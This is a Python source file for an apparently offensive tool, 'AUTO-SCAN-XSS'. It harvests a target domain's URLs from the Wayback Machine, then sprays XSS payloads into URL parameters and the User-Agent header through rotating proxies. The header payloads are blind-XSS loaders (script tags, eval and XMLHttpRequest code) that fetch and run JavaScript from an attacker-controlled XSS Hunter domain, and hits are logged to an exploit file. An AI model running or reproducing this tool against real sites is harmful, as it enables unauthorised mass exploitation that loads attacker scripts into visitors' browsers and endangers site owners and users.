"""
███████╗██╗   ██╗██╗██╗         ████████╗██╗    ██╗██╗███╗   ██╗     ██╗ █████╗ ███████╗███████╗██╗
██╔════╝██║   ██║██║██║         ╚══██╔══╝██║    ██║██║████╗  ██║    ██╔╝██╔══██╗██╔════╝██╔════╝╚██╗
█████╗  ██║   ██║██║██║            ██║   ██║ █╗ ██║██║██╔██╗ ██║    ██║ ███████║█████╗  ███████╗ ██║
██╔══╝  ╚██╗ ██╔╝██║██║            ██║   ██║███╗██║██║██║╚██╗██║    ██║ ██╔══██║██╔══╝  ╚════██║ ██║
███████╗ ╚████╔╝ ██║███████╗       ██║   ╚███╔███╔╝██║██║ ╚████║    ╚██╗██║  ██║███████╗███████║██╔╝
╚══════╝  ╚═══╝  ╚═╝╚══════╝       ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝
"""
import os

import sys

from  lib.user_agent import user_agent

if os.name != 'posix':

    sys.exit()

try:

    from colored import fg,attr

except:

    os.system('python3 -m pip install colored')

try:

    import requests

except:

    os.system('python3 -m pip install requests')

try:

    import urllib.parse

except:

    os.system('python3 -m pip install urllib')

try:

    import argparse

except:

    os.system('python3 -m pip install  argparse')

try:

    import random

except:

    os.system('python3 -m pip install random')

os.system('clear')

print("""{0}                                                                                                                                        
              /$$$$$$  /$$   /$$ /$$$$$$$$ /$$$$$$           /$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$        /$$   /$$  /$$$$$$   /$$$$$$ 
             /$$__  $$| $$  | $$|__  $$__//$$__  $$         /$$__  $$ /$$__  $$ /$$__  $$| $$$ | $$       | $$  / $$ /$$__  $$ /$$__  $$
            | $$  \ $$| $$  | $$   | $$  | $$  \ $$        | $$  \__/| $$  \__/| $$  \ $$| $$$$| $$       |  $$/ $$/| $$  \__/| $$  \__/
            | $$$$$$$$| $$  | $$   | $$  | $$  | $$ /$$$$$$|  $$$$$$ | $$      | $$$$$$$$| $$ $$ $$ /$$$$$$\  $$$$/ |  $$$$$$ |  $$$$$$ 
            | $$__  $$| $$  | $$   | $$  | $$  | $$|______/ \____  $$| $$      | $$__  $$| $$  $$$$|______/ >$$  $$  \____  $$ \____  $$
            | $$  | $$| $$  | $$   | $$  | $$  | $$         /$$  \ $$| $$    $$| $$  | $$| $$\  $$$        /$$/\  $$ /$$  \ $$ /$$  \ $$
            | $$  | $$|  $$$$$$/   | $$  |  $$$$$$/        |  $$$$$$/|  $$$$$$/| $$  | $$| $$ \  $$       | $$  \ $$|  $$$$$$/|  $$$$$$/
            |__/  |__/ \______/    |__/   \______/          \______/  \______/ |__/  |__/|__/  \__/       |__/  |__/ \______/  \______/ 
              {1}       
                                          {0}#################################################################{1}
                                          {0}#{1}                    AUTO-SCAN-XSS V 1.0                        {0}#{1}
                                          {0}#{1}                    ===================                        {0}#{1}
                                          {0}#{1}                       From MHT                           {0}#{1}
                                          {0}#{1}                    ===================                        {0}#{1}
                                          {0}#{1}                                                               {0}#{1}
                                          {0}#################################################################{1}                                                                                                               
""".format(fg(1),attr(0)))

p = argparse.ArgumentParser()

p.add_argument('-u','--url',help='Enter Target Url  {-u target.com}')

p.add_argument('-fd','--FileDomains',help='Enter file Domains {-fd file_Domains.txt}')

p.add_argument('-XH','--XssHunter',help='Enter You domains xsshunter { -XH autoscanxss.xss.ht}')

p.add_argument('-pl','--ProxyList',help='Enter Proxy List Http  {-pl proxyis.txt  >  proxy file content  ip:port > 127.0.0.1:8080}')

a = p.parse_args()


class scan():

    def scan_one_url(self,domain,xsshunter,proxylist):

        url = 'https://web.archive.org/cdx/search/cdx?url=*.' + domain + '&output=text&fl=original&collapse=urlkey'

        re = requests.get(url)

        resp = re.text

        p = open('file/url.txt', 'w')

        p.write(resp)

        op = open('file/url.txt').read().split()

        for i in op:

            filter1 = urllib.parse.parse_qs(urllib.parse.unquote(i))

            for ii in filter1:

                if 'http://' in ii or 'https://' in ii :

                    open("file/{}.txt".format(domain),'a').write(ii+'= \n')

        os.system("cat file/{0}.txt    | sort  | uniq  -d  > file/{1}.txt".format(domain,domain+'uniq'))

        payload_user_agent = [

                            '"><script src=https://{0}></script>'.format(xsshunter),

                            "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://{0}\';document.body.appendChild(a)')".format(xsshunter),

                            '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//%s ");a.send();</script>'%(xsshunter),

                            '<script>$.getScript("//{0}")</script>'.format(xsshunter)

                            ]
        list_payloads = open("file/payload.txt").read().splitlines()

        url_list_scan = open("file/{0}.txt".format(domain+'uniq')).read().split()

        if proxylist:

            openfile = open(proxylist).read().splitlines()

            randomlin = random.choice(openfile)

            proxies = {'http':'http://{0}'.format(randomlin)}

        else:

            proxies = None

        for iii in url_list_scan :

            for i in payload_user_agent:

                for payloads in list_payloads:

                    req = requests.get(url=iii+payloads,headers={'User-Agent': user_agent()+i},proxies=proxies)

                    resp = req.text

                    if i in resp or payloads in i :

                        print("{0}[*]+{1} {2}This  a Target Injured{1}  {3}['{1}".format(fg(40),attr(0),fg(2),fg(9))+ iii+payloads +"{0}']{1}".format(fg(9),attr(0)))

                        open("file/exploit.txt",'a').write(iii+payloads)

                    else:

                        print('''
                        
                        {0}[-]+{1} {3}This  a Target Not Injured {2}{1}
                                   {0}[Header_Injection:{1} {5}{4}{1}  {0}]{1}
                        '''.format(fg(9),attr(0),iii+payloads,fg(1),user_agent()+i,fg(22)))

                        #---------------------------------------------------------------#
                        #---------------------------------------------------------------#
                        #---------------------------------------------------------------#

    def scan_list_domain(self,domainlist,xsshunter,proxylist):

        domains = open(domainlist).read().split()


        for i in domains:

            url = 'https://web.archive.org/cdx/search/cdx?url=*.' + i + '&output=text&fl=original&collapse=urlkey'

            re = requests.get(url)

            resp = re.text

            p = open('file/url.txt', 'w')

            p.write(resp)

        op = open('file/url.txt').read().split()

        for i in op:

            filter1 = urllib.parse.parse_qs(urllib.parse.unquote(i))

            for ii in filter1:

                if 'http://' in ii or 'https://' in ii:

                    open("file/alldomains.txt", 'a').write(ii + '= \n')

        os.system("cat file/{0}.txt    | sort  | uniq  -d  > file/{1}.txt".format('alldomains', 'alldomains' + 'uniq'))

        payload_user_agent = [

            '"><script src=https://{0}></script>'.format(xsshunter),

            "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://{0}\';document.body.appendChild(a)')".format(xsshunter),

            '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//%s ");a.send();</script>' % (xsshunter),

            '<script>$.getScript("//{0}")</script>'.format(xsshunter)

                            ]

        list_payloads = open("file/payload.txt").read().splitlines()

        url_list_scan = open("file/{0}.txt".format('alldomains' + 'uniq')).read().split()

        if proxylist:

            openfile = open(proxylist).read().splitlines()

            randomlin = random.choice(openfile)

            proxy = {'http':'http://{0}'.format(randomlin)}

        else:

            proxy = None

        for iii in url_list_scan:

            for i in payload_user_agent:

                for payloads in list_payloads:

                    req = requests.get(url=iii + payloads, headers={'User-Agent': user_agent() + i},proxies=proxy)

                    resp = req.text

                    if i in resp or payloads in i:

                        print("{0}[*]+{1} {2}This  a Target Injured{1}  {3}['{1}".format(fg(40), attr(0), fg(2), fg(9)) + iii + payloads + "{0}']{1}".format(fg(9), attr(0)))

                        open("file/exploit.txt", 'a').write(iii + payloads)

                    else:

                        print('''

                            {0}[-]+{1} {3}This  a Target Not Injured {2}{1}
                                        |
                                       {0}[Header_Injection:{1} {5}{4}{1}  {0}]{1}
                                       
                            '''.format(fg(9), attr(0), iii + payloads, fg(1), user_agent() + i, fg(22)))


scan = scan()


if a.ProxyList and a.url and a.XssHunter:

    scan.scan_one_url(domain=a.url, xsshunter=a.XssHunter, proxylist=a.ProxyList)

elif a.url and a.XssHunter:

    scan.scan_one_url(domain=a.url, xsshunter=a.XssHunter, proxylist=None)

elif a.FileDomains and a.ProxyList and  a.XssHunter :

    scan.scan_list_domain(domainlist=a.FileDomains, xsshunter=a.XssHunter, proxylist=a.ProxyList)

elif a.FileDomains  and  a.XssHunter :

    scan.scan_list_domain(domainlist=a.FileDomains, xsshunter=a.XssHunter, proxylist=None)

else:
    print('python3 Auto-Scan-Xss.py -h')
